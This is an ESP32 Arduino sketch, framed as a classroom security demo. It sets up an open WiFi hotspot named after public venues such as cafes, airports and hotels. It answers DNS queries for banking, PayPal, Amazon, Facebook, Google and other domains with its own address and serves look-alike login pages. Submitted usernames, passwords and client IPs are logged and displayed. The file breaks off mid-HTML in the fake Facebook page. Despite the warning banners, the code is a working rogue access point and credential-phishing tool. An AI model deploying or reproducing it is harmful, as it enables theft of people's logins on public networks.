// WiSpy - ESP32 WiFi Security Demonstration Tool
// Educational tool for teaching network security
// This version uses HTTP (unencrypted) - perfect for demonstrating security vulnerabilities

#include <WiFi.h>
#include <WebServer.h>
#include <esp_bt.h>
#include <WiFiUdp.h>

// WiFi Hotspot Configuration
// ========================================
// CLASSROOM TESTING CONFIGURATION
// ========================================
// QUICK SETUP GUIDE:
// 1. Uncomment ONE line below to set hotspot name
// 2. Flash to ESP32
// 3. Repeat for each ESP32 with different names
// 4. No conflicts - each ESP32 gets unique name!
//
// HOTSPOT NAMES:
// #define HOTSPOT_NAME 1  // "FreeCafeWiFi"
// #define HOTSPOT_NAME 2  // "Airport_WiFi_Free"
// #define HOTSPOT_NAME 3  // "Hotel_Guest_Network"
// #define HOTSPOT_NAME 4  // "Starbucks_WiFi"
// #define HOTSPOT_NAME 5  // "McDonald's_Free_WiFi"
// #define HOTSPOT_NAME 6  // "Library_Public_WiFi"
// #define HOTSPOT_NAME 7  // "CoffeeShop_Guest"
// #define HOTSPOT_NAME 8  // "Mall_Free_Internet"
// #define HOTSPOT_NAME 9  // "University_Guest"
// #define HOTSPOT_NAME 10 // "Restaurant_WiFi"
//
// EXAMPLE WORKFLOW:
// ESP32 #1: Uncomment line 1, flash, label "ESP32-1"
// ESP32 #2: Uncomment line 2, flash, label "ESP32-2"
// ESP32 #3: Uncomment line 3, flash, label "ESP32-3"
// etc...
// ========================================

// Default to name 1 if none selected
#ifndef HOTSPOT_NAME
#define HOTSPOT_NAME 3
#endif

// Hotspot name definitions
#if HOTSPOT_NAME == 1
const char* ssid = "FreeCafeWiFi";
#elif HOTSPOT_NAME == 2
const char* ssid = "Airport_WiFi_Free";
#elif HOTSPOT_NAME == 3
const char* ssid = "Hotel_Guest_Network";
#elif HOTSPOT_NAME == 4
const char* ssid = "Starbucks_WiFi";
#elif HOTSPOT_NAME == 5
const char* ssid = "McDonald's_Free_WiFi";
#elif HOTSPOT_NAME == 6
const char* ssid = "Library_Public_WiFi";
#elif HOTSPOT_NAME == 7
const char* ssid = "CoffeeShop_Guest";
#elif HOTSPOT_NAME == 8
const char* ssid = "Mall_Free_Internet";
#elif HOTSPOT_NAME == 9
const char* ssid = "University_Guest";
#elif HOTSPOT_NAME == 10
const char* ssid = "Restaurant_WiFi";
#else
const char* ssid = "FreeCafeWiFi";  // Fallback
#endif
const char* password = "12345678";          // WPA2 password (8+ characters)

// Web server on standard HTTP port
WebServer server(80);

// DNS server for hijacking attacks
WiFiUDP dnsServer;
const int DNS_PORT = 53;

// LED pin for visual feedback
const int LED_PIN = 5;

// Password capture statistics
int passwords_captured = 0;
String last_captured_password = "";
String last_captured_username = "";
String last_captured_ip = "";

// DNS hijacking configuration
const char* hijacked_domains[] = {
  "www.mybank.com",
  "www.paypal.com", 
  "www.amazon.com",
  "www.facebook.com",
  "www.google.com",
  "www.github.com",
  "www.stackoverflow.com"
};
const int num_hijacked_domains = 7;
IPAddress hijack_ip = IPAddress(192, 168, 4, 1); // Redirect to our server

// HTML for the login page
const char* loginPage = R"(
<!DOCTYPE html>
<html>
<head>
    <title>WiSpy Security Demo - Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0; 
            padding: 20px; 
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container { 
            background: white; 
            padding: 30px; 
            border-radius: 10px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 100%;
        }
        h1 { 
            color: #333; 
            text-align: center; 
            margin-bottom: 30px;
        }
        .form-group { 
            margin-bottom: 20px; 
        }
        label { 
            display: block; 
            margin-bottom: 5px; 
            color: #555;
            font-weight: bold;
        }
        input[type="password"] { 
            width: 100%; 
            padding: 12px; 
            border: 2px solid #ddd; 
            border-radius: 5px; 
            font-size: 16px;
            box-sizing: border-box;
        }
        input[type="password"]:focus {
            border-color: #667eea;
            outline: none;
        }
        button { 
            width: 100%; 
            padding: 12px; 
            background: #667eea; 
            color: white; 
            border: none; 
            border-radius: 5px; 
            font-size: 16px; 
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover { 
            background: #5a6fd8; 
        }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        .result {
            margin-top: 20px;
            padding: 15px;
            border-radius: 5px;
            text-align: center;
            font-weight: bold;
        }
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Security Demo Login</h1>
        <div class="warning">
            <strong>Educational Warning:</strong> This connection is NOT secure! 
            All data is transmitted in plain text and can be easily intercepted.
        </div>
        <form method="POST" action="/login">
            <div class="form-group">
                <label for="password">Enter Password:</label>
                <input type="password" id="password" name="password" required 
                       placeholder="Type your password here..." autocomplete="off">
            </div>
            <button type="submit">Submit Password</button>
        </form>
        <div id="result"></div>
    </div>
</body>
</html>
)";

// Forward declarations
void handleRoot();
void handleLogin();
void handleStats();
void handleCaptured();
void handleFakeBank();
void handleFakePayPal();
void handleFakeAmazon();
void handleFakeFacebook();
void handleFakeGoogle();
void handleFakeGitHub();
void handleFakeStackOverflow();
void handleDNSTest();
void handlePing();
void handleNotFound();
void handleDomainRedirect();
void startDNSServer();
void handleDNSRequest();
String extractDomainName(uint8_t* data, int length, int offset);

void setup() {
  // Initialize serial communication
  Serial.begin(115200);
  delay(1000);
  
  // Ensure Bluetooth is stopped to avoid PHY GPIO reservations
  btStop();
  
  // Set WiFi mode FIRST to avoid GPIO conflicts
  WiFi.mode(WIFI_OFF);
  delay(100);
  WiFi.mode(WIFI_AP);
  delay(100);
  WiFi.setSleep(false);
  
  // Initialize LED pin (using GPIO 5 to avoid conflicts)
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);
  
  Serial.println("\n=== WiSpy - ESP32 Security Demo Setup ===");
  Serial.println("This ESP32 will create a WiFi hotspot for educational purposes");
  Serial.println("Students will learn about network security vulnerabilities");
  Serial.println("========================================");
  Serial.print("Hotspot Name: ");
  Serial.println(ssid);
  Serial.print("Hotspot ID: ");
  Serial.println(HOTSPOT_NAME);
  Serial.println("========================================");
  
  // Additional WiFi configuration to avoid GPIO conflicts
  WiFi.disconnect();
  delay(200);
  
  // Create WiFi Access Point
  Serial.print("Creating WiFi hotspot: ");
  Serial.println(ssid);
  
  // Configure AP parameters to avoid GPIO conflicts
  // Set gateway, subnet, and DNS server to the ESP32's IP
  IPAddress local_IP(192, 168, 4, 1);
  IPAddress gateway(192, 168, 4, 1);
  IPAddress subnet(255, 255, 255, 0);
  IPAddress dns_server(192, 168, 4, 1);
  
  WiFi.softAPConfig(local_IP, gateway, subnet);
  
  // Start the access point
  // Note: This uses OPEN WiFi (no encryption) so students can see HTTP traffic in plain text
  bool apStarted = WiFi.softAP(ssid, NULL, 6, 0, 8); // channel 6, hidden=false, max_connections=8, OPEN (no password)
  
  if (apStarted) {
    Serial.println("WiFi Access Point started successfully!");
  } else {
    Serial.println("Failed to start WiFi Access Point!");
    return;
  }
  
  // Wait a moment for AP to fully initialize
  delay(2000);
  
  // Get the IP address
  IPAddress IP = WiFi.softAPIP();
  Serial.print("Hotspot IP address: ");
  Serial.println(IP);
  Serial.print("Network: ");
  Serial.println(ssid);
  Serial.println("Password: NONE (Open WiFi)");
  Serial.print("MAC Address: ");
  Serial.println(WiFi.softAPmacAddress());
  Serial.println("Students can connect to this network and visit: http://192.168.4.1");
  
  // Check if any devices are connected
  Serial.print("Connected devices: ");
  Serial.println(WiFi.softAPgetStationNum());
  
  // Set up web server routes
  // Note: We don't register "/" here because handleDomainRedirect handles all routes
  server.on("/login", handleLogin);
  server.on("/stats", handleStats);
  server.on("/captured", handleCaptured);
  server.on("/bank", handleFakeBank);
  server.on("/paypal", handleFakePayPal);
  server.on("/amazon", handleFakeAmazon);
  server.on("/facebook", handleFakeFacebook);
  server.on("/google", handleFakeGoogle);
  server.on("/github", handleFakeGitHub);
  server.on("/stackoverflow", handleFakeStackOverflow);
  server.on("/test", handleDNSTest);
  server.on("/ping", handlePing);
  server.onNotFound(handleDomainRedirect);
  
  // Start the server
  server.begin();
  Serial.println("HTTP server started on port 80");
  
  // Start DNS hijacking server
  startDNSServer();
  
  Serial.println("Ready for students to connect and test!");
  Serial.println("Students can now try visiting popular websites!");
  
  // Blink LED to indicate ready
  for(int i = 0; i < 3; i++) {
    digitalWrite(LED_PIN, HIGH);
    delay(200);
    digitalWrite(LED_PIN, LOW);
    delay(200);
  }
}

void loop() {
  // Handle web server requests
  server.handleClient();
  
  // Handle DNS hijacking requests
  handleDNSRequest();
  
  // Blink LED every 2 seconds to show it's running
  static unsigned long lastBlink = 0;
  if (millis() - lastBlink > 2000) {
    digitalWrite(LED_PIN, !digitalRead(LED_PIN));
    lastBlink = millis();
  }
  
  // Print status every 10 seconds for debugging
  static unsigned long lastStatus = 0;
  if (millis() - lastStatus > 10000) {
    Serial.print("Status - Connected devices: ");
    Serial.println(WiFi.softAPgetStationNum());
    Serial.print("Credentials stolen: ");
    Serial.println(passwords_captured);
    lastStatus = millis();
  }
}

// Handle root page
void handleRoot() {
  Serial.println("Client connected to main page");
  server.send(200, "text/html", loginPage);
}

// Handle login form submission
void handleLogin() {
  // Check if password was provided
  if (server.hasArg("password")) {
    String submittedPassword = server.arg("password");
    
    // Capture the IP address of the client
    String clientIP = server.client().remoteIP().toString();
    
    // Password captured silently for educational purposes
    
    // Store the captured credentials
    passwords_captured++;
    last_captured_password = submittedPassword;
    last_captured_username = server.hasArg("username") ? server.arg("username") : "Unknown";
    last_captured_ip = clientIP;
    
    // Create response page
    String responsePage = R"(
<!DOCTYPE html>
<html>
<head>
    <title>WiSpy Security Demo - Result</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0; 
            padding: 20px; 
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container { 
            background: white; 
            padding: 30px; 
            border-radius: 10px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            max-width: 500px;
            width: 100%;
        }
        h1 { color: #333; text-align: center; }
        .warning {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            color: #721c24;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }
        .info {
            background: #d1ecf1;
            border: 1px solid #bee5eb;
            color: #0c5460;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }
        .password-display {
            background: #f8f9fa;
            border: 2px solid #dee2e6;
            padding: 8px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 16px;
            font-weight: bold;
            color: #e74c3c;
            word-break: break-all;
            display: inline-block;
            max-width: 100%;
            line-height: 1.2;
            margin: 2px 0;
        }
        button {
            background: #667eea;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover { background: #5a6fd8; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Security Analysis Result</h1>
        
        <div class="warning">
            <strong>SECURITY VULNERABILITY DETECTED!</strong><br>
            Your password was transmitted in plain text and is visible to anyone monitoring the network.
        </div>
        
        <div class="info">
            <strong>What we captured:</strong><br>
            <strong>Password:</strong> <span class="password-display">)" + submittedPassword + R"(</span><br>
            <strong>Method:</strong> HTTP POST (unencrypted)<br>
            <strong>Timestamp:</strong> )" + String(millis()) + R"( ms since boot
        </div>
        
        <div class="info">
            <strong>Educational Points:</strong><br>
            - This demonstrates why HTTPS is essential for real applications<br>
            - Network monitoring tools like Wireshark can easily capture this data<br>
            - Even with WPA2 WiFi encryption, web traffic needs HTTPS protection<br>
            - Always use HTTPS for any sensitive data transmission
        </div>
        
        <div style="text-align: center; margin-top: 20px;">
            <button onclick="window.location.href='/'">Try Again</button>
            <button onclick="window.location.href='/captured'" style="margin-left: 10px; background: #e74c3c;">View All Captured</button>
            <button onclick="window.location.href='/test'" style="margin-left: 10px; background: #27ae60;">Test DNS Hijacking</button>
        </div>
    </div>
</body>
</html>
)";
    
    server.send(200, "text/html", responsePage);
  } else {
    // No password provided
    server.send(400, "text/html", "<h1>Error: No password provided</h1><a href='/'>Go back</a>");
  }
}

// Handle domain redirects based on Host header
void handleDomainRedirect() {
  String host = server.hostHeader();
  
  // If no host header or IP address, show main page
  if (host.length() == 0 || host == "192.168.4.1" || host.indexOf("192.168.4.1") >= 0) {
    handleRoot();
    return;
  }
  
  if (host.indexOf("mybank.com") >= 0) {
    Serial.println("Hijacked domain: " + host + " -> Fake Bank Page");
    handleFakeBank();
  } else if (host.indexOf("paypal.com") >= 0) {
    Serial.println("Hijacked domain: " + host + " -> Fake PayPal Page");
    handleFakePayPal();
  } else if (host.indexOf("amazon.com") >= 0) {
    Serial.println("Hijacked domain: " + host + " -> Fake Amazon Page");
    handleFakeAmazon();
  } else if (host.indexOf("facebook.com") >= 0) {
    Serial.println("Hijacked domain: " + host + " -> Fake Facebook Page");
    handleFakeFacebook();
  } else if (host.indexOf("google.com") >= 0) {
    Serial.println("Hijacked domain: " + host + " -> Fake Google Page");
    handleFakeGoogle();
  } else if (host.indexOf("github.com") >= 0) {
    Serial.println("Hijacked domain: " + host + " -> Fake GitHub Page");
    handleFakeGitHub();
  } else if (host.indexOf("stackoverflow.com") >= 0) {
    Serial.println("Hijacked domain: " + host + " -> Fake Stack Overflow Page");
    handleFakeStackOverflow();
  } else {
    Serial.println("Unknown hijacked domain: " + host + " -> Generic Educational Page");
    // Show a generic educational page instead of 404
    String genericPage = R"(
<!DOCTYPE html>
<html>
<head>
    <title>Educational WiFi Security Demo</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #f0f0f0; }
        .container { max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { color: #d32f2f; text-align: center; }
        .warning { background: #ffebee; border: 1px solid #f44336; padding: 15px; border-radius: 5px; margin: 20px 0; }
        .info { background: #e3f2fd; border: 1px solid #2196f3; padding: 15px; border-radius: 5px; margin: 20px 0; }
        a { color: #1976d2; text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Educational WiFi Security Demo</h1>
        
        <div class="warning">
            <h3>DNS Hijacking Detected!</h3>
            <p>You tried to visit: <strong>)" + host + R"(</strong></p>
            <p>This domain was hijacked by our educational ESP32 hotspot!</p>
        </div>
        
        <div class="info">
            <h3>What happened?</h3>
            <ul>
                <li>Your device asked: "Where is )" + host + R"(?"</li>
                <li>Our ESP32 replied: "It's at 192.168.4.1"</li>
                <li>Your browser connected to our fake server instead</li>
                <li>This demonstrates how attackers can redirect traffic!</li>
            </ul>
        </div>
        
        <p><strong>Educational Value:</strong> This shows why HTTPS and certificate validation are important for security!</p>
        
        <p><a href="http://192.168.4.1/">Return to Main Demo Page</a></p>
    </div>
</body>
</html>
)";
    server.send(200, "text/html", genericPage);
  }
}

// Handle ping requests
void handlePing() {
  String target = server.hasArg("target") ? server.arg("target") : "8.8.8.8";
  Serial.println("Ping request for: " + target);
  
  // Simple ping response (for demo purposes)
  String response = "PING " + target + " (192.168.4.1): 56 data bytes\n";
  response += "64 bytes from 192.168.4.1: icmp_seq=1 ttl=64 time=1.234 ms\n";
  response += "64 bytes from 192.168.4.1: icmp_seq=2 ttl=64 time=0.987 ms\n";
  response += "64 bytes from 192.168.4.1: icmp_seq=3 ttl=64 time=1.123 ms\n";
  response += "\n--- " + target + " ping statistics ---\n";
  response += "3 packets transmitted, 3 received, 0% packet loss\n";
  response += "round-trip min/avg/max = 0.987/1.115/1.234 ms\n";
  
  server.send(200, "text/plain", response);
}

// Handle 404 errors
void handleNotFound() {
  String message = "File Not Found\n\n";
  message += "URI: ";
  message += server.uri();
  message += "\nMethod: ";
  message += (server.method() == HTTP_GET) ? "GET" : "POST";
  message += "\nArguments: ";
  message += server.args();
  message += "\n";
  for (uint8_t i = 0; i < server.args(); i++) {
    message += " " + server.argName(i) + ": " + server.arg(i) + "\n";
  }
  server.send(404, "text/plain", message);
}

// Handle statistics request
void handleStats() {
  String json = "{";
  json += "\"count\":" + String(passwords_captured) + ",";
  json += "\"lastPassword\":\"" + last_captured_password + "\",";
  json += "\"lastUsername\":\"" + last_captured_username + "\",";
  json += "\"lastIp\":\"" + last_captured_ip + "\"";
  json += "}";
  
  server.send(200, "application/json", json);
}

// Handle captured passwords display
void handleCaptured() {
  String html = R"(
<!DOCTYPE html>
<html>
<head>
    <title>Captured Passwords - Security Demo</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { 
            font-family: 'Courier New', monospace; 
            background: #1a1a1a; 
            color: #00ff00; 
            margin: 0; 
            padding: 20px; 
        }
        .header { 
            background: #e74c3c; 
            color: white;
            padding: 20px; 
            border-radius: 10px; 
            margin-bottom: 20px;
            text-align: center;
        }
        .stats { 
            background: #2d2d2d; 
            padding: 20px; 
            border-radius: 10px; 
            margin-bottom: 20px;
            border-left: 4px solid #e74c3c;
        }
        .password-item { 
            background: #2d2d2d; 
            margin: 10px 0; 
            padding: 15px; 
            border-radius: 5px; 
            border-left: 4px solid #e74c3c;
        }
        .password-header { 
            font-weight: bold; 
            color: #ff6b6b; 
            margin-bottom: 5px;
        }
        .password-details { 
            color: #00ffff; 
            margin: 5px 0;
        }
        .password-value { 
            color: #ff6b6b; 
            font-weight: bold;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>CAPTURED PASSWORDS</h1>
        <p>Server-Side Password Logging</p>
    </div>
    
    <div class="stats">
        <h2>Statistics</h2>
        <p>Total Passwords Captured: )" + String(passwords_captured) + R"(</p>
        <p>Last Password: )" + last_captured_password + R"(</p>
        <p>Last Username: )" + last_captured_username + R"(</p>
        <p>Last IP: )" + last_captured_ip + R"(</p>
    </div>
    
    <div class="password-item">
        <div class="password-header">Latest Capture</div>
        <div class="password-details">
            <p>Username: )" + last_captured_username + R"(</p>
            <p>Password: <span class="password-value">)" + last_captured_password + R"(</span></p>
            <p>IP Address: )" + last_captured_ip + R"(</p>
        </div>
    </div>
    
    <div style="text-align: center; margin-top: 30px;">
        <a href="/" style="color: #00ff00;">Back to Login</a>
    </div>
</body>
</html>
)";
  
  server.send(200, "text/html", html);
}

// DNS Hijacking Functions
void startDNSServer() {
  if (dnsServer.begin(DNS_PORT)) {
    Serial.println("DNS Server started - Hijacking domains to 192.168.4.1");
    Serial.println("Hijacked domains: mybank.com, paypal.com, amazon.com, facebook.com, google.com, github.com, stackoverflow.com");
  } else {
    Serial.println("Failed to start DNS server");
  }
}

void handleDNSRequest() {
  uint8_t buffer[512];
  int packetSize = dnsServer.parsePacket();
  
  if (packetSize > 0) {
    int len = dnsServer.read(buffer, 512);
    
    // Check if this is a DNS query
    if (len > 12 && buffer[2] == 0x01) { // Standard query
      String domain = extractDomainName(buffer, len, 12);
      
      if (domain.length() > 0) {
        // Check if this domain should be hijacked
        bool shouldHijack = false;
        for (int i = 0; i < num_hijacked_domains; i++) {
          if (domain.equals(hijacked_domains[i])) {
            shouldHijack = true;
            break;
          }
        }
        
        if (shouldHijack) {
          Serial.println("DNS Hijacked: " + domain + " -> 192.168.4.1");
          
          // Create DNS response
          uint8_t response[512];
          int responseLen = 0;
          
          // Copy query header
          for (int i = 0; i < 12; i++) {
            response[responseLen++] = buffer[i];
          }
          
          // Set response flags (QR=1, AA=1, RA=1)
          response[2] = 0x81; // Response
          response[3] = 0x80; // Recursion available
          
          // Set answer count to 1
          response[6] = 0x00;
          response[7] = 0x01;
          
          // Copy question section
          int qLen = 12;
          while (qLen < len && buffer[qLen] != 0) {
            response[responseLen++] = buffer[qLen++];
          }
          response[responseLen++] = 0x00; // End of question name
          qLen++;
          
          // Copy QTYPE and QCLASS
          response[responseLen++] = buffer[qLen++];
          response[responseLen++] = buffer[qLen++];
          response[responseLen++] = buffer[qLen++];
          response[responseLen++] = buffer[qLen++];
          
          // Add answer section
          // Name (compressed pointer to question)
          response[responseLen++] = 0xC0;
          response[responseLen++] = 0x0C;
          
          // Type A (0x0001)
          response[responseLen++] = 0x00;
          response[responseLen++] = 0x01;
          
          // Class IN (0x0001)
          response[responseLen++] = 0x00;
          response[responseLen++] = 0x01;
          
          // TTL (300 seconds)
          response[responseLen++] = 0x00;
          response[responseLen++] = 0x00;
          response[responseLen++] = 0x01;
          response[responseLen++] = 0x2C;
          
          // Data length (4 bytes for IPv4)
          response[responseLen++] = 0x00;
          response[responseLen++] = 0x04;
          
          // IP address (192.168.4.1)
          response[responseLen++] = 192;
          response[responseLen++] = 168;
          response[responseLen++] = 4;
          response[responseLen++] = 1;
          
          // Send response
          dnsServer.beginPacket(dnsServer.remoteIP(), dnsServer.remotePort());
          dnsServer.write(response, responseLen);
          dnsServer.endPacket();
        }
        // Silently ignore non-hijacked domains
      }
    }
  }
}

String extractDomainName(uint8_t* data, int length, int offset) {
  String domain = "";
  int pos = offset;
  
  while (pos < length && data[pos] != 0) {
    int labelLen = data[pos];
    if (labelLen > 63 || pos + labelLen >= length) break;
    
    if (domain.length() > 0) domain += ".";
    
    for (int i = 0; i < labelLen; i++) {
      pos++;
      if (pos < length) {
        domain += (char)data[pos];
      }
    }
    pos++;
  }
  
  return domain;
}

// Fake bank login page
void handleFakeBank() {
  String uri = server.uri();
  
  // Handle favicon requests
  if (uri == "/favicon.ico") {
    server.send(404, "text/plain", "Not Found");
    return;
  }
  
  String fakeBankPage = R"(
<!DOCTYPE html>
<html>
<head>
    <title>MyBank - Online Banking</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            margin: 0; 
            padding: 20px; 
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container { 
            background: white; 
            padding: 40px; 
            border-radius: 15px; 
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
            max-width: 450px;
            width: 100%;
        }
        .bank-logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .bank-logo h1 {
            color: #1e3c72;
            margin: 0;
            font-size: 32px;
            font-weight: bold;
            text-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
        .warning {
            background: #e74c3c;
            color: white;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: bold;
        }
        .form-group { 
            margin-bottom: 20px; 
        }
        label { 
            display: block; 
            margin-bottom: 8px; 
            color: #1e3c72;
            font-weight: bold;
        }
        input[type="text"], input[type="password"] { 
            width: 100%; 
            padding: 15px; 
            border: 2px solid #bdc3c7; 
            border-radius: 8px; 
            font-size: 16px;
            box-sizing: border-box;
        }
        button { 
            width: 100%; 
            padding: 15px; 
            background: #1e3c72; 
            color: white; 
            border: none; 
            border-radius: 8px; 
            font-size: 18px; 
            cursor: pointer;
            font-weight: bold;
        }
        button:hover { 
            background: #2a5298; 
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="bank-logo">
            <h1>MyBunk</h1>
            <p style="color: #666; font-size: 12px; margin: 5px 0;">Fake Bank - Educational Demo</p>
            <p>Online Banking Portal</p>
        </div>
        
        <div class="warning">
            DEMO WARNING: This is a fake bank page for educational purposes!
        </div>
        
        <form method="POST" action="/login">
            <div class="form-group">
                <label for="username">Account Number:</label>
                <input type="text" id="username" name="username" required 
                       placeholder="Enter your account number" autocomplete="off">
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required 
                       placeholder="Enter your password" autocomplete="off">
            </div>
            <button type="submit">Sign In to MyBank</button>
        </form>
    </div>
</body>
</html>
)";
  
  server.send(200, "text/html", fakeBankPage);
}

// Fake PayPal login page
void handleFakePayPal() {
  String uri = server.uri();
  
  // Handle favicon requests
  if (uri == "/favicon.ico") {
    server.send(404, "text/plain", "Not Found");
    return;
  }
  
  String fakePayPalPage = R"(
<!DOCTYPE html>
<html>
<head>
    <title>PayPal - Sign In</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: #0070ba;
            margin: 0; 
            padding: 20px; 
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container { 
            background: white; 
            padding: 40px; 
            border-radius: 15px; 
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
            max-width: 450px;
            width: 100%;
        }
        .paypal-logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .paypal-logo h1 {
            color: #0070ba;
            margin: 0;
            font-size: 32px;
            font-weight: bold;
            text-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
        .warning {
            background: #e74c3c;
            color: white;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: bold;
        }
        .form-group { 
            margin-bottom: 20px; 
        }
        label { 
            display: block; 
            margin-bottom: 8px; 
            color: #0070ba;
            font-weight: bold;
        }
        input[type="text"], input[type="password"] { 
            width: 100%; 
            padding: 15px; 
            border: 2px solid #bdc3c7; 
            border-radius: 8px; 
            font-size: 16px;
            box-sizing: border-box;
        }
        button { 
            width: 100%; 
            padding: 15px; 
            background: #0070ba; 
            color: white; 
            border: none; 
            border-radius: 8px; 
            font-size: 18px; 
            cursor: pointer;
            font-weight: bold;
        }
        button:hover { 
            background: #005ea6; 
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="paypal-logo">
            <h1>PayPall</h1>
            <p style="color: #666; font-size: 12px; margin: 5px 0;">Fake PayPal - Security Demo</p>
            <p>Sign in to your account</p>
        </div>
        
        <div class="warning">
            DEMO WARNING: This is a fake PayPal page for educational purposes!
        </div>
        
        <form method="POST" action="/login">
            <div class="form-group">
                <label for="username">Email or Mobile:</label>
                <input type="text" id="username" name="username" required 
                       placeholder="Enter your email or mobile" autocomplete="off">
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required 
                       placeholder="Enter your password" autocomplete="off">
            </div>
            <button type="submit">Sign In to PayPal</button>
        </form>
    </div>
</body>
</html>
)";
  
  server.send(200, "text/html", fakePayPalPage);
}

// Fake Amazon login page
void handleFakeAmazon() {
  String uri = server.uri();
  
  // Handle favicon requests
  if (uri == "/favicon.ico") {
    server.send(404, "text/plain", "Not Found");
    return;
  }
  
  String fakeAmazonPage = R"(
<!DOCTYPE html>
<html>
<head>
    <title>Amazon - Sign In</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: #f0f0f0;
            margin: 0; 
            padding: 20px; 
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container { 
            background: white; 
            padding: 40px; 
            border-radius: 15px; 
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
            max-width: 450px;
            width: 100%;
        }
        .amazon-logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .amazon-logo h1 {
            color: #ff9900;
            margin: 0;
            font-size: 32px;
            font-weight: bold;
            text-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
        .amazon-logo h1:after {
            content: " ->";
            color: #000;
            font-size: 20px;
        }
        .warning {
            background: #e74c3c;
            color: white;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: bold;
        }
        .form-group { 
            margin-bottom: 20px; 
        }
        label { 
            display: block; 
            margin-bottom: 8px; 
            color: #333;
            font-weight: bold;
        }
        input[type="text"], input[type="password"] { 
            width: 100%; 
            padding: 15px; 
            border: 2px solid #bdc3c7; 
            border-radius: 8px; 
            font-size: 16px;
            box-sizing: border-box;
        }
        button { 
            width: 100%; 
            padding: 15px; 
            background: #ff9900; 
            color: white; 
            border: none; 
            border-radius: 8px; 
            font-size: 18px; 
            cursor: pointer;
            font-weight: bold;
        }
        button:hover { 
            background: #e68900; 
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="amazon-logo">
            <h1>Amazom</h1>
            <p style="color: #666; font-size: 12px; margin: 5px 0;">Not Amazon - Educational Demo</p>
            <p>Sign in to your account</p>
        </div>
        
        <div class="warning">
            DEMO WARNING: This is a fake Amazon page for educational purposes!
        </div>
        
        <form method="POST" action="/login">
            <div class="form-group">
                <label for="username">Email or Phone:</label>
                <input type="text" id="username" name="username" required 
                       placeholder="Enter your email or phone" autocomplete="off">
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required 
                       placeholder="Enter your password" autocomplete="off">
            </div>
            <button type="submit">Sign In to Amazon</button>
        </form>
    </div>
</body>
</html>
)";
  
  server.send(200, "text/html", fakeAmazonPage);
}

// Fake Facebook page
void handleFakeFacebook() {
  String uri = server.uri();
  
  // Handle favicon requests
  if (uri == "/favicon.ico") {
    server.send(404, "text/plain", "Not Found");
    return;
  }
  
  String fakeFacebookPage = R"(
<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: #f0f0f0;
            margin: 0; 
            padding: 20px; 
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container { 
            background: white; 
            padding: 30px; 
            border-radius: 8px; 
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }
        .logo { 
            text-align: center; 
